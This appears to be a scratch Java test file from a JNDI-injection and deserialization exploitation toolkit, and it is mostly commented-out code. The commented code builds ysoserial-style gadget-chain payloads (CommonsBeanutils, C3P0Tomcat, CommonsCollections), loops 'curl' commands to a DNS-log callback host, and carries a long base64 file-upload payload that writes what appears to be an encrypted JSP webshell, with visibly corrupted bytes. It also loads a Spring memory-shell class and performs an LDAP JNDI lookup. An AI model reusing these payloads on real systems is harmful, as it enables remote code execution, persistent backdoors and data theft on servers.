package test;

import javax.naming.Context;
import javax.naming.InitialContext;

import static ysoserial.payloads.util.Gadgets.createTemplatesImpl;

public class test {


    public static void main(String[] args) throws Exception {

//        //instantiate them and store in the routes map
//        for(Class<?> controller : controllers) {
//            Constructor<?> cons = controller.getConstructor();
//            LdapController instance = (LdapController) cons.newInstance();
//            String[] mappings = controller.getAnnotation(LdapMapping.class).uri();
//            for(String mapping : mappings) {
//                if(mapping.startsWith("/"))
//                    mapping = mapping.substring(1); //remove first forward slash
//
//                routes.put(mapping, instance);
//            }
//        }
//        String s= payload.getPayload("C3P0Tomcat","open /System/Applications/Calculator.app");
//        Serializer.serialize(new C3P0Tomcat().getObject("a"));
        /** c3P0Tomcat序列化 **/
//        String bs = "";
////        System.out.println(Base64.encode(Serializer.serialize(new C3P0Tomcat().getObject("a"))));
//        C3P0Tomcat c3P0Tomcat= new C3P0Tomcat();
//        Object object = new C3P0Tomcat().getObject("a");
//        byte[] ser = Serializer.serialize(object);
//        ObjectPayload.Utils.releasePayload(c3P0Tomcat, object);
//        bs = Base64.encode(ser);
//        System.out.println(bs);

//        System.out.println(Functions.makeJavaScriptString("123"));

//        PayloadRunner.run(JavassistWeld1.class, args);


//        ArrayList<Class> arrayList = new ArrayList<Class>();
//        arrayList.add(CommonsBeanutils1.class);
//        arrayList.add(CommonsCollections7.class);
//        arrayList.add(CommonsCollectionsK1.class);
//        arrayList.add(CommonsCollectionsK2.class);
//        arrayList.add(CommonsCollectionsK3.class);
//        arrayList.add(CommonsCollectionsK4.class);
//        String dns="tik5w.p1kd31.gcyrs.xyz";
//        String key ="change this immediately";
//        String command="";
//        System.out.println("key为："+key);
//        for (int i=0;i<6;i++) {
//            command="curl "+arrayList.get(i).getName()+dns;
//            String s = (String) new HmacKeyLeakRce().getObject(arrayList.get(i).getName(), key,command);
//            s = java.net.URLEncoder.encode(s, "utf-8");
//            System.out.println("执行命令为："+command +" 使用反序列链："+arrayList.get(i).getName());
//            System.out.println(s);
//            System.out.println();
//        }
//
//    }
//        String s = payload.getPayload("FileUpload1", "writeOldB64;wwww.class;77+977+977+977+9MzNvcmcvYXBhY2hlL2pzcC93d3d3X2pzcCVvcmcvYXBhY2hlL2phc3Blci9ydW50aW1lL0h0dHBKc3BCYXNlLG9yZy9hcGFjaGUvamFzcGVyL3J1bnRpbWUvSnNwU291cmNlRGVwZW5kZW4qb3JnL2FwYWNoZS9qYXNwZXIvcnVudGltZS9Kc3BTb3VyY2VJbXBvcnRzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9qc3B4RmFjdG9yeUxqYXZheC9zZXJ2bGV0L2pzcC9Kc3BGYWN0b3J5O19qc3B4X2RlcGVuZGFudHNMamF2YS91dGlsL01hcDsJU2lnbmF0dXJlM0xqYXZhL3V0aWwvTWFwPExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvTG9uZzs+O19qc3B4X2ltcG9ydHNfcGFja2FnZXNMamF2YS91dGlsL1NldDsjTGphdmEvdXRpbC9TZXQ8TGphdmEvbGFuZy9TdHJpbmc7PjtfanNweF9pbXBvcnRzX2NsYXNzZXNfZWxfZXhwcmVzc2lvbmZhY3RvcnlMamF2YXgvZWwvRXhwcmVzc2lvbkZhY3Rvcnk7X2pzcF9pbnN0YW5jZW1hbmFnZXIjTG9yZy9hcGFjaGUvdG9tY2F0L0luc3RhbmNlTWFuYWdlcjxjbGluaXQ+KClWQ29kZQpqYXZheC9zZXJ2bGV0L2pzcC9Kc3BGYWN0b3J5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnZXREZWZhdWx0RmFjdG9yeSAoKUxqYXZheC9zZXJ2bGV0L2pzcC9Kc3BGYWN0b3J5OwkhCgojamF2YS91dGlsL0hhc2hTZXQKIiUKICAmPGluaXQ+CSgKICAgICAgICAgICAgICAgICoKICAgICAgICAgICAgICAgICBqYXZheC5jcnlwdG8KamF2YS91dGlsL1NldCAgICAgICAgICAgICAgICAsLi0KamF2YXguc2VydmxlNC8wYWphdmEudXRpNmphdmF4LnNlcnZsZXQuaHR0OGphdmF4LmNyeXB0by5zcGU6amF2YXguc2VydmxldC5qc3AJPAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMaW5lTnVtYmVyVGFibGVMb2NhbFZhcmlhYmxlVGFibGUKZ2V0RGVwZW5kYW50cygpTGphdmEvdXRpbC9NYXA7NSgpTGphdmEvdXRpbC9NYXA8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9Mb25nOz47CUYKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdldFBhY2thZ2VJbXBvcnRzKClMamF2YS91dGlsL1NldDslKClMamF2YS91dGlsL1NldDxMamF2YS9sYW5nL1N0cmluZzs+O2dldENsYXNzSW1wb3J0c19qc3BfZ2V0RXhwcmVzc2lvbkZhY3RvcnkoKUxqYXZheC9lbC9FeHByZXNzaW9uRmFjdG9yeTsJTgoKUAogUVJnZXRTZXJ2bGV0Q29uZmlnKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRWVWF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXWGdldFNlcnZsZXRDb250ZXh0ICgpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7CloKIFtcZ2V0SnNwQXBwbGljYXRpb25Db250ZXh0SShMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDspTGphdmF4L3NlcnZsZXQvanNwL0pzcEFwcGxpY2F0aW9uQ29udGV4dDsKIF5gXydqYXZheC9zZXJ2bGV0L2pzcC9Kc3BBcHBsaWNhdGlvbkNvbnRleHQKU3RhY2tNYXBUYWJsZWRqYXZhL2xhbmcvVGhyb3dhYmxlX2pzcF9nZXRJbnN0YW5jZU1hbmFnZXIlKClMb3JnL2FwYWNoZS90b21jYXQvSW5zdGFuY2VNYW5hZ2VyOwloCgpqbGswb3JnL2FwYWNoZS9qYXNwZXIvcnVudGltZS9JbnN0YW5jZU1hbmFnZXJGYWN0b3J5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtbmdldEluc3RhbmNlTWFuYWdlckIoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspTG9yZy9hcGFjaGUvdG9tY2F0L0luc3RhbmNlTWFuYWdlcl9qc3BJbml0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfanNwRGVzdHJveQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfanNwU2VydmljZVIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWCkV4Y2VwdGlvbnN1amF2YS9pby9JT0V4Y2VwdGlvbndqYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHl7eiVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0CiAgfH0JZ2V0TWV0aG9kKClMamF2YS9sYW5nL1N0cmluZ39HRVQK77+977+977+9amF2YS9sYW5nL1N0cmluZwogICAgICAgICAgICAgICAgICAg77+9MGVxdWFs77+9UE9T77+9SEVBRAnvv73vv73vv71qYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg77+977+9RVJST1JMamF2YXgvc2VydmxldC9EaXNwYXRjaGVyVHlwZTsKICAgICAgICB577+9CiAgICAgICAgICDvv73vv71nZXREaXNwYXRjaGVyVHlwZSAoKUxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlOwrvv73vv708SlNQIOWPquWFgeiuuCBHRVTjgIFQT1NUIOaIliBIRUFE44CCSmFzcGVyIOi/mOWFgeiuuCBPUFRJT05TCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIO+/ve+/ve+/vSZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDvv73vv70Jc2VuZEVycm9yKElMamF2YS9sYW5nL1N0cmluZzsp77+9CXRleHQvaHRtbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIO+/ve+/vQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg77+977+9c2V0Q29udGVudFR5cGUoTGphdmEvbGFuZy9TdHJpbmc7KVYK77+9CiDvv73vv71nZXRQYWdlQ29udGV4dO+/vShMamF2YXgvc2VydmxldC9TZXJ2bGV0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL1N0cmluZztaSVopTGphdmF4L3NlcnZsZXQvanNwL1BhZ2VDb250ZXh0Owrvv71W77+9amF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQK77+9UArvv73vv70KICDvv73vv70KZ2V0U2Vzc2lvbiIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247Cu+/ve+/vQogIO+/ve+/vWdldE91dCgpTGphdmF4L3NlcnZsZXQvanNwL0pzcFdyaXRlcu+/vWU0NWUzMjlmZWI1ZDkyNe+/vXUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIO+/ve+/ve+/vWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg77+9cHV0VmFsdWUnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0Oynvv71BRVMK77+977+977+9amF2YXgvY3J5cHRvL0NpcGhlcgogICAgICAgICAgICAgICAgICAgICAg77+977+9CiAgICAgICAgICAgICAgICAgICAgICAgIGdldEluc3RhbmNlKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI777+9amF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwrvv73vv70KICDvv71nZXRCeXRlcygpW0IK77+977+9CiAgJu+/vShbQkxqYXZhL2xhbmcvU3RyaW5nOylWCu+/ve+/vQogIO+/ve+/vWluaXQoSUxqYXZhL3NlY3VyaXR5L0tleTspVu+/vW9yZy9hcGFjaGUvanNwL3d3d3dfanNwJFUK77+977+977+9amF2YS9sYW5nL09iamVjdAogICAgICAgICAgICAgICAgICAg77+9Z2V0Q2xhc3MoKUxqYXZhL2xhbmcvQ2xhc3M7Cu+/ve+/ve+/vWphdmEvbGFuZy9DbGFzcwogICAgICAgICAgICAgICAgICDvv73vv71nZXRDbGFzc0xvYWRlcigpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsK77+977+9CiAgJu+/vTMoTG9yZy9hcGFjaGUvanNwL3d3d3dfanNwO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVbvv71zdW4vbWlzYy9CQVNFNjREZWNvZGVyCu+/vSUKICB577+9CiAgICDvv73vv70JZ2V0UmVhZGVyKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsK77+977+977+9amF2YS9pby9CdWZmZXJlZFJlYWRlcgogICAgICAgICAgICAgICAgICAgICAgICAg77+9cmVhZExpbmUK77+977+9CiAg77+977+9CiAgICBkZWNvZGVCdWZmZXIoTGphdmEvbGFuZy9TdHJpbmc7KVtCCu+/ve+/vQogIO+/ve+/vWRvRmluYWwoW0IpW0IK77+977+9CiAg77+977+9ZyhbQilMamF2YS9sYW5nL0NsYXNzOwrvv73vv70KICDvv73vv70KICAgIG5ld0luc3RhbmNlKClMamF2YS9sYW5nL09iamVjdDsK77+977+9I2phdmF4L3NlcnZsZXQvanNwL1NraXBQYWdlRXhjZXB0aW9uCmF2YXgvc2VydmxldC9qc3AvSnNwV3JpdGVyCmdldEJ1ZmZlclNpemUoKUkKICAgICAgICAgICAgICAgIO+/vQoKCmlzQ29tbWl0dGVkKClaCgoKZmx1c2gKCgpjbGVhckJ1ZmZlcgrvv70KIGhhbmRsZVBhZ2VFeGNlcHRpb24oTGphdmEvbGFuZy9UaHJvd2FibGU7KVYKdgogJgoKcmVsZWFzZVBhZ2VDb250ZXh0IihMamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQ7KVZyZXF1ZXN0J0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXNyZXNwb25zZShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX2pzcHhfbWV0aG9kTGphdmEvbGFuZy9TdHJpbmc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFnZUNvbnRleHRMamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQ7c2Vzc2lvbiBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uO291dExqYXZheC9zZXJ2bGV0L2pzcC9Kc3BXcml0ZXI7CV9qc3B4X291dF9qc3B4X3BhZ2VfY29udGV4dGtjTGphdmF4L2NyeXB0by9DaXBoZXI7dExqYXZhL2xhbmcvVGhyb3dhYmxlOwp3d3d3X2pzcC5qYXZhCiAgICAgICAgICAgICBJbm5lckNsYXNzZXNVU291cmNlRGVidWdFeHRlbnNpb24xCgoKCkJCCu+/vVfvv73vv70g77+9Ilnvv70k77+9J++/vScp77+9K1fvv70nMe+/vStX77+9JzPvv70rV++/vSc177+9K1fvv70nN++/vStX77+9Jznvv70rV++/vTvvv709LgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICEiIyYkMSU8JkcnUihWKT4mLyrvv70/77+9PT4KRC7vv71F77+9PS8+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQEFCQwpJLu+/vSfvv709Mz5AQUdICkku77+9O++/vT03PkBBSkgKICAgICAgICBAQUtM77+9Nyrvv71N77+9LipZTO+/vSrvv71N77+9ICrvv71P77+9U++/vVnvv71d77+9TSvDpyvDvyrvv71N77+9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLC8vMS89OzwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0+KjwyQj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA3QEFi77+9KkRj77+9ZWbvv70qKu+/vWfvv70hKllM77+9Ku+/vWfvv70qKu+/vU/vv71p77+9ZyvDpyvDvyrvv71n77+9CiAgICAiIiQiPUZHCiAgICAgICAgICAgSElHJU0+CiAgICAgICAgICAgICAgICAgKkBBYu+/vURj77+9byvvv709UT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEBBcCvvv709VD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQEFxcnN0du+/vQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYSvvv714Tn4t77+977+977+9MO+/vS3vv73vv73vv70n77+9Le+/ve+/ve+/ve+/ve+/vSvvv73vv73vv73vv73vv70s77+977+977+977+977+9Ojo6LO+/ve+/ve+/ve+/vSAqKywg77+977+9Ou+/ve+/vVfvv73vv71X77+977+9Ou+/ve+/vTo6K++/vXjvv73vv73vv73vv73vv73vv706Ce+/vQnvv73vv73vv73vv73vv706Cgrvv73vv71ZCe+/ve+/ve+/ve+/vcq2zbvvv71ZKirvv73Tttm377+9Cu+/ve+/vVnvv73vv70r77+977+977+977+977+977+977+977+977+977+9V++/vWk6CQnvv73vv73vv71HOu+/vSXvv73vv70s77+977+9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg77+9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIO+/vQrvv712WQnvv73vv73vv73vv73vv706ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDvv73vv73vv70KICAgICAgICAgICAgICDvv73vv70Kent8fSN/J++/vTbvv71A77+9S++/vU3vv71V77+9WO+/vWDvv70+empRa1dsXWtibWZubG9ycHlx77+9cu+/vXTvv71177+9du+/vXd4CiAgICAgICAgICAgICAgICAgICAgICAgIGFAQWFhWiBi77+9ISJAISMkQyUmRicmSSjvv71ZKSAJ77+9RyorCu+/vUwsLQliQArvv70977+977+977+9CXnvv73vv73vv73vv71j77+9K2NHdO+/vQlKYwogICAgICAgICAgICAgICAgICAgICAgICAgIC4vMArvv70xMkhTTUFQCnd3d3dfanNwLmphdmEKSlNQCipTIEpTUAoqRgorIDAgd3d3dy5qc3AKd3d3dy5qc3AKKkwKMToyMgoxOjExNgoqRQ==");
//
//        s = java.net.URLEncoder.encode(s, "utf-8");
//        String command="writeOld;"+args[0]+"/FileUpload1.txt;hello";
//        System.out.println("command:"+command);
//        String s = payload.getPayload("FileUpload1",command);
//        System.out.println(java.net.URLEncoder.encode("O"+s, "utf-8"));
//
//
//        System.out.println("CommonsBeanutils1");
//        String cb1="open -a calculator";
//        String cb1C = payload.getPayload("CommonsBeanutils1",cb1);
//        String a ="O"+cb1C;
//        System.out.println(java.net.URLEncoder.encode(a, "utf-8"));
//
//
//
//        System.out.println("CommonBeanutilsNoCC");
//        CommonsBeanutils183NOCC commonBeanutilsNoCC=new CommonsBeanutils183NOCC();
//        String command="open -a calculator";
//        Object object = commonBeanutilsNoCC.getObject(command);
//        byte[] ser = Serializer.serialize(object);
//        String cb22 = Base64.encode(ser);
//        String b ="O"+cb22;
//        System.out.println(java.net.URLEncoder.encode(b, "utf-

//        String command="CLASS:SpringInterceptorMemShell";
//        command="FILE:/Users/lvzhibo/IdeaProjects/JNDIInject/data/Exploit.class";
////        File file=new File(command.substring(5));
////        byte[] bs = Files.readBytes(file);
////        System.out.println(file.getName().substring(0,file.getName().lastIndexOf(".class")));
////        System.out.println(Files.filename(String.valueOf(file)));
//
//
//        byte[] bytes = Files.readBytes(new File("data/Exploit.class"));
//        String result = Util.base64Encode(bytes);
//        System.out.println(result);
//        String loadshell="ysoserial.payloads.templates."+command.substring(6);
//        Class clazz=Class.forName(loadshell);


//        ClassPool pool = ClassPool.getDefault();
//        CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
////        CtField field = CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctClass);
////        ctClass.addField(field);
//        Class beanCompareClazz = ctClass.toClass();
//
//        BeanComparator clazz = new BeanComparator((String)null, String.CASE_INSENSITIVE_ORDER);
//        Field ss=beanCompareClazz.getDeclaredField("serialVersionUID");
//        ss.setAccessible(true);
//        System.out.println("1:"+ss.get("test.test"));
//        Field cc=clazz.getClass().getDeclaredField("serialVersionUID");
//        cc.setAccessible(true);
//        System.out.println("2:"+cc.get("test.test"));
////        for (Field field1: clazz.getFields()){
////            System.out.println(field1.getName());
////        }
//        BeanComparator comparator = (BeanComparator)beanCompareClazz.newInstance();
//        Class clazz=Class.forName("ysoserial.payloads.templates.SpringInterceptorMemShell");
//        String code=Util.getClassCode(clazz);
//        System.out.println(code);
//        String uri2="ldap://127.0.0.1:1389/basic/memshell/FILE:Exp";
//        System.out.println(uri2.toLowerCase());
//        Context ctx = new InitialContext();
//        ctx.lookup(uri2);
        System.out.println(System.getProperty("java.version").replaceAll("\\.","_"));
//        String className = "FILE:Exp";
//        String cla = className.substring(5);
//        String path = "data/" + cla+".class";
//        byte[] bytes = Files.readBytes(new File(path));
    }
}
